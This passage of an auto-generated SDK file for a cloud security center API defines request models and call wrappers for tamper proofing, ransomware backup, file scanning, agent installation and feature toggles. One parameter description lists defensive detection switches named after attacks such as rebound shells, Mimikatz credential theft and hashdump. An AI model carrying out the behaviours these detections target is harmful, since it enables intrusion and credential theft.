  id?: int32(name='Id', description='The ID of the protected directory for which you want to change the status of web tamper proofing.

> You can call the [DescribeWebLockConfigList](~~DescribeWebLockConfigList~~) operation to query the IDs of protected directories.

This parameter is required.', example='312077'),
  inclusiveFile?: string(name='InclusiveFile', description='The file for which you want to enable web tamper proofing.

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='/home/admin/test.log'),
  inclusiveFileType?: string(name='InclusiveFileType', description='The type of the file for which you want to enable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='jpg'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  localBackupDir?: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.\\\\
The directory format of a Linux server is different from that of a Windows server. You must enter the directory in the required format based on your operating system. Examples:

*   Linux server: /usr/local/aegis/bak
*   Windows server: C:\\\\Program Files (x86)\\\\Alibaba\\\\Aegis\\\\bak

This parameter is required.', example='/usr/local/backup'),
  mode?: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified subdirectories, file types, and files in the protected directory.', example='blacklist'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='36.112.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the protected directory is located.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model ModifyWebLockUpdateConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockUpdateConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyWebLockUpdateConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the protection policy for a specified server.
 *
 * @param request ModifyWebLockUpdateConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyWebLockUpdateConfigResponse
 */
async function modifyWebLockUpdateConfigWithOptions(request: ModifyWebLockUpdateConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockUpdateConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.inclusiveFile)) {
    query['InclusiveFile'] = request.inclusiveFile;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockUpdateConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the protection policy for a specified server.
 *
 * @param request ModifyWebLockUpdateConfigRequest
 * @return ModifyWebLockUpdateConfigResponse
 */
async function modifyWebLockUpdateConfig(request: ModifyWebLockUpdateConfigRequest): ModifyWebLockUpdateConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockUpdateConfigWithOptions(request, runtime);
}

model ModifyWebPathRequest {
  config?: string(name='Config', description='The configuration of the web directory. The value of this parameter is in the JSON format and contains the following fields:

*   **webPathType**: the type of the web directory
*   **webPath**: the web directory', example='{
      "webPathType": "customize",
      "webPath": "/root/www****"
}'),
  target?: string(name='Target', description='The protected asset to which the web directory belongs. The value of this parameter is in the JSON format and contains the following fields:

*   **target**: the protected asset.
*   **targetType**: the type of the asset. Set the value to uuid.
*   **flag**: the type of the operation.', example='[{"target":"0186127a-d33e-4d0c-94fb-8f25f87bc69f","targetType":"uuid","flag":"add"}]'),
  type?: string(name='Type', description='The type of the configuration item. Set the value to **web_path**.', example='web_path'),
}

model ModifyWebPathResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='20623245-7E5E-52CA-9640-7502F119****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyWebPathResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyWebPathResponseBody(name='body'),
}

/**
 * @summary Modifies a custom web directory.
 *
 * @param request ModifyWebPathRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyWebPathResponse
 */
async function modifyWebPathWithOptions(request: ModifyWebPathRequest, runtime: Util.RuntimeOptions): ModifyWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies a custom web directory.
 *
 * @param request ModifyWebPathRequest
 * @return ModifyWebPathResponse
 */
async function modifyWebPath(request: ModifyWebPathRequest): ModifyWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebPathWithOptions(request, runtime);
}

model OpenBackupAutoConfigRequest {
  maxBatchSize?: int32(name='MaxBatchSize', description='The number of servers specified in a batch of anti-ransomware policies that are automatically generated by the managed anti-ransomware feature.

>  The maximum value is 50. If the number of specified servers exceeds 50, the value 50 is used.', example='20'),
}

model OpenBackupAutoConfigResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='ADE57832-9666-511C-9A80-B87DE2E8****'),
}

model OpenBackupAutoConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OpenBackupAutoConfigResponseBody(name='body'),
}

/**
 * @summary Enables the automatic configuration of anti-ransomware policies for servers in the managed anti-ransomware feature. You can call this operation only after you purchase the managed anti-ransomware feature.
 *
 * @param request OpenBackupAutoConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OpenBackupAutoConfigResponse
 */
async function openBackupAutoConfigWithOptions(request: OpenBackupAutoConfigRequest, runtime: Util.RuntimeOptions): OpenBackupAutoConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.maxBatchSize)) {
    query['MaxBatchSize'] = request.maxBatchSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OpenBackupAutoConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables the automatic configuration of anti-ransomware policies for servers in the managed anti-ransomware feature. You can call this operation only after you purchase the managed anti-ransomware feature.
 *
 * @param request OpenBackupAutoConfigRequest
 * @return OpenBackupAutoConfigResponse
 */
async function openBackupAutoConfig(request: OpenBackupAutoConfigRequest): OpenBackupAutoConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return openBackupAutoConfigWithOptions(request, runtime);
}

model OpenPartialBuyRequest {
  instanceId?: string(name='InstanceId'),
}

model OpenPartialBuyResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model OpenPartialBuyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OpenPartialBuyResponseBody(name='body'),
}

/**
 * @summary 开启按量购买
 *
 * @param request OpenPartialBuyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OpenPartialBuyResponse
 */
async function openPartialBuyWithOptions(request: OpenPartialBuyRequest, runtime: Util.RuntimeOptions): OpenPartialBuyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OpenPartialBuy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 开启按量购买
 *
 * @param request OpenPartialBuyRequest
 * @return OpenPartialBuyResponse
 */
async function openPartialBuy(request: OpenPartialBuyRequest): OpenPartialBuyResponse {
  var runtime = new Util.RuntimeOptions{};
  return openPartialBuyWithOptions(request, runtime);
}

model OpenSensitiveFileScanRequest {
  switchOn?: string(name='SwitchOn', description='Specifies whether to enable or disable sensitive file scan. Valid values:

*   **on**: enables sensitive file scan
*   **off**: disables sensitive file scan', example='on'),
}

model OpenSensitiveFileScanResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    switchOn?: string(name='SwitchOn', description='Indicates whether sensitive file scan is enabled or disabled. Valid values:

*   **on**: enabled
*   **off**: disabled', example='on'),
  }(name='Data', description='The data.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B4A4C081-7F06-5481-9323-02A5419B9423'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model OpenSensitiveFileScanResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OpenSensitiveFileScanResponseBody(name='body'),
}

/**
 * @summary Enables or disables sensitive file scan.
 *
 * @param request OpenSensitiveFileScanRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OpenSensitiveFileScanResponse
 */
async function openSensitiveFileScanWithOptions(request: OpenSensitiveFileScanRequest, runtime: Util.RuntimeOptions): OpenSensitiveFileScanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.switchOn)) {
    query['SwitchOn'] = request.switchOn;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OpenSensitiveFileScan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables sensitive file scan.
 *
 * @param request OpenSensitiveFileScanRequest
 * @return OpenSensitiveFileScanResponse
 */
async function openSensitiveFileScan(request: OpenSensitiveFileScanRequest): OpenSensitiveFileScanResponse {
  var runtime = new Util.RuntimeOptions{};
  return openSensitiveFileScanWithOptions(request, runtime);
}

model OperateAgentClientInstallRequest {
  instanceIds?: string(name='InstanceIds', description='The IDs of the servers on which you want to install the Security Center agent. Separate multiple IDs with commas (,).

> : You must specify at least one of **InstanceIds** and **Uuids**. If you specify **InstanceIds**, you must also specify **Region** and **Os**.', example='i-uf6j8vq9l4r5ntht****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  os?: string(name='Os', description='The operating system of the servers. Valid values:

*   **linux**
*   **windows**', example='linux'),
  region?: string(name='Region', description='The region where the servers reside. Valid values include the following regions:

*   cn-hangzhou: China (Hangzhou)
*   cn-beijing: China (Beijing)
*   cn-shanghai: China (Shanghai)
*   cn-zhangjiakou: China (Zhangjiakou)
*   cn-shenzhen: China (Shenzhen)', example='cn-hangzhou'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which you want to install the Security Center agent. Separate multiple UUIDs with commas (,).

> You must specify at least one of the **InstanceIds** and **Uuids** parameters before you can call this operation.', example='1587bedb-fdb4-48c4-9330-************'),
}

model OperateAgentClientInstallResponseBody = {
  aegisCelintInstallResposeList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6j8vq9l4r5ntht****'),
      recordId?: long(name='RecordId', description='The ID of the installation task.', example='2856'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='1587bedb-fdb4-48c4-9330-****'),
    }
  ](name='AegisCelintInstallResposeList', description='An array that consists of the returned results.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AE79B457-877C-51C6-AD72-0D34A025D***'),
}

model OperateAgentClientInstallResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateAgentClientInstallResponseBody(name='body'),
}

/**
 * @summary Installs the Security Center agent on servers.
 *
 * @param request OperateAgentClientInstallRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateAgentClientInstallResponse
 */
async function operateAgentClientInstallWithOptions(request: OperateAgentClientInstallRequest, runtime: Util.RuntimeOptions): OperateAgentClientInstallResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.region)) {
    query['Region'] = request.region;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateAgentClientInstall',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Installs the Security Center agent on servers.
 *
 * @param request OperateAgentClientInstallRequest
 * @return OperateAgentClientInstallResponse
 */
async function operateAgentClientInstall(request: OperateAgentClientInstallRequest): OperateAgentClientInstallResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateAgentClientInstallWithOptions(request, runtime);
}

model OperateApplicationRequest {
  containerWebDefenseApplicationDTOS?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the cluster ID.

This parameter is required.', example='ceb68cc58234141828677e383bd21ff0c'),
      flag?: string(name='Flag', description='Specifies whether to apply the configuration to the asset. Valid values:

*   **add**: applied
*   **del**: not applied

This parameter is required.', example='add'),
      id?: long(name='Id', description='The application ID. If the application is newly added, you do not need to specify this parameter.', example='196'),
      tag?: string(name='Tag', description='The value of the application tag.

This parameter is required.', example='app:app-003'),
    }
  ](name='ContainerWebDefenseApplicationDTOS', description='The container application that is protected from being tampered with.

This parameter is required.'),
  ruleId?: long(name='RuleId', description='The ID of the rule.

This parameter is required.', example='300566'),
}

model OperateApplicationResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='79B067A4-54EB-5560-B5C8-425ABEDC2784'),
}

model OperateApplicationResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateApplicationResponseBody(name='body'),
}

/**
 * @summary Adds or deletes container applications for tamper proofing.
 *
 * @param request OperateApplicationRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateApplicationResponse
 */
async function operateApplicationWithOptions(request: OperateApplicationRequest, runtime: Util.RuntimeOptions): OperateApplicationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.containerWebDefenseApplicationDTOS)) {
    query['ContainerWebDefenseApplicationDTOS'] = request.containerWebDefenseApplicationDTOS;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateApplication',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds or deletes container applications for tamper proofing.
 *
 * @param request OperateApplicationRequest
 * @return OperateApplicationResponse
 */
async function operateApplication(request: OperateApplicationRequest): OperateApplicationResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateApplicationWithOptions(request, runtime);
}

model OperateBucketScanTaskRequest {
  bucketName?: string(name='BucketName', description='The name of the bucket.', example='iboxpublic****'),
  operateCode?: int32(name='OperateCode', description='The operation that you want to perform on the bucket. Valid value:

*   **1**: cancels the bucket check.', example='1'),
}

model OperateBucketScanTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='0C8487EF-50C2-54BB-8634-10F8C35D****'),
}

model OperateBucketScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateBucketScanTaskResponseBody(name='body'),
}

/**
 * @summary Manages an Object Storage Service (OSS) bucket check task.
 *
 * @param request OperateBucketScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateBucketScanTaskResponse
 */
async function operateBucketScanTaskWithOptions(request: OperateBucketScanTaskRequest, runtime: Util.RuntimeOptions): OperateBucketScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bucketName)) {
    query['BucketName'] = request.bucketName;
  }
  if (!Util.isUnset(request.operateCode)) {
    query['OperateCode'] = request.operateCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateBucketScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Manages an Object Storage Service (OSS) bucket check task.
 *
 * @param request OperateBucketScanTaskRequest
 * @return OperateBucketScanTaskResponse
 */
async function operateBucketScanTask(request: OperateBucketScanTaskRequest): OperateBucketScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateBucketScanTaskWithOptions(request, runtime);
}

model OperateCommonOverallConfigRequest {
  config?: string(name='Config', description='Specifies whether to enable or disable the feature. Valid values:

*   **on**: enable
*   **off**: disable

This parameter is required.', example='on'),
  noTargetAsOn?: boolean(name='NoTargetAsOn', description='Specifies whether to configure assets for the feature. Default value: **false**. Valid values:

*   **true**
*   **false**

>  This parameter takes effect only when you set **Config** to **on**.', example='true'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='223.79.XX.XX'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE_38857**: Entrance service execution high-risk operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50858**: Web service performs high-risk operations (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50859**: Entrance service execution suspicious operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50862**: Cloud Assistant Advanced Protection (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50867**: Create malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50868**: Create suspicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE_64025**: Ingress service execute command [enhanced mode] (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51229**: Browser service execution a high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51230**: Entrance service execution suspicious operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51232**: System processes execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51233**: Java service execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51234**: Office components execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51235**: Web service performs high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52820**: Create malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52826**: Entrance service execution high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE_55251**: Database services execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE_63725**: Ingress service implants suspicious script/binary file (Windows)
*   **USER-ENABLE-SWITCH-TYPE_3277**: Suspicious process startup (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50983**: obfuscated command (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51200**: Command line download and run malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE_71131**: Ingress service executes sequence of suspicious behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51225**: Powershell executes high-risk commands (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51226**: Powershell execute suspicious command (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52821**: Suspicious process startup (Windows)
*   **USER-ENABLE-SWITCH-TYPE_57242**: Malicious command execution (Windows)
*   **USER-ENABLE-SWITCH-TYPE_57340**: Command line download and run malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE_39659**: Sensitive Registry Key Protection (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52816**: high-risk account manipulation behavior (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54365**: Create service autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54366**: Create high-risk autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54367**: Create scheduled task autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54368**: Create registry autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54369**: Create WMI autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE_50869**: Unauthorized execution of high-risk orders (Linux)
*   **USER-ENABLE-SWITCH-TYPE_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges (Linux)
*   **USER-ENABLE-SWITCH-TYPE_54395**: Unauthorized reading and writing of sensitive files (Linux)
*   **USER-ENABLE-SWITCH-TYPE_57897**: suspected privilege escalation (Linux)
*   **USER-ENABLE-SWITCH-TYPE_52825**: Unauthorized execution of high-risk orders (Windows)
*   **USER-ENABLE-SWITCH-TYPE_5507**: malicious drivers (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50876**: Against security software (Linux)
*   **USER-ENABLE-SWITCH-TYPE_53168**: process debugging (Linux)
*   **USER-ENABLE-SWITCH-TYPE_54699**: Hijack dynamic link library (Linux)
*   **USER-ENABLE-SWITCH-TYPE_62981**: Bypassing security monitoring (Linux)
*   **USER-ENABLE-SWITCH-TYPE_52815**: Load high-risk drivers (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52823**: Running high-risk ARK tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54373**: Against security software (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54374**: Intrusion trace cleanup (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54265**: Hijacking the PAM Module (Linux)
*   **USER-ENABLE-SWITCH-TYPE_54953**: Hashdump Attack (Linux)
*   **USER-ENABLE-SWITCH-TYPE_54383**: MimiKatz Credential Stealing (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54384**: Hashdump Attack (Windows)
*   **USER-ENABLE-SWITCH-TYPE_50861**: Information detection (Linux)
*   **USER-ENABLE-SWITCH-TYPE_52818**: Information detection (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54034**: Intranet scan (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51228**: High-risk lateral penetration tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE_50870**: Rebound Shell (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE_51236**: Rebound Shell (Windows)
*   **USER-ENABLE-SWITCH-TYPE_50877**: Malicious soft communication (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50884**: Suspicious worm script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50885**: malicious script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51201**: ransomware (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51202**: Suspected Extortion (Linux)
*   **USER-ENABLE-SWITCH-TYPE_52827**: ransomware (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52828**: Suspected Extortion (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52829**: delete system backup behavior (Windows)

This parameter is required.', example='kdump_switch'),
}

model OperateCommonOverallConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model OperateCommonOverallConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateCommonOverallConfigResponseBody(name='body'),
}

/**
 * @summary Enables or disables a feature by type.
 *
 * @param request OperateCommonOverallConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateCommonOverallConfigResponse
 */
async function operateCommonOverallConfigWithOptions(request: OperateCommonOverallConfigRequest, runtime: Util.RuntimeOptions): OperateCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.noTargetAsOn)) {
    query['NoTargetAsOn'] = request.noTargetAsOn;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables a feature by type.
 *
 * @param request OperateCommonOverallConfigRequest
 * @return OperateCommonOverallConfigResponse
 */
async function operateCommonOverallConfig(request: OperateCommonOverallConfigRequest): OperateCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateCommonOverallConfigWithOptions(request, runtime);
}

model OperateCommonTargetConfigRequest {
  fieldName?: string(name='FieldName', description='The type of the image. Valid values:

*   **repoName**: the name of the image repository
*   **repoNamespace**: the namespace of the image repository', example='repoName'),
  fieldValue?: string(name='FieldValue', description='The name of the image repository or the namespace of the image repository.', example='cafcmc-dev'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='182.92.XXX.XXX'),
  targetOperations?: string(name='TargetOperations', description='The configuration of proactive defense for your server. The value includes the following fields:

*   **targetType**: specifies the dimension from which you manage proactive defense. UUIDs are supported. Set the value to **uuid**.
*   **target**: specifies the UUID of the server for which you want to configure proactive defense.
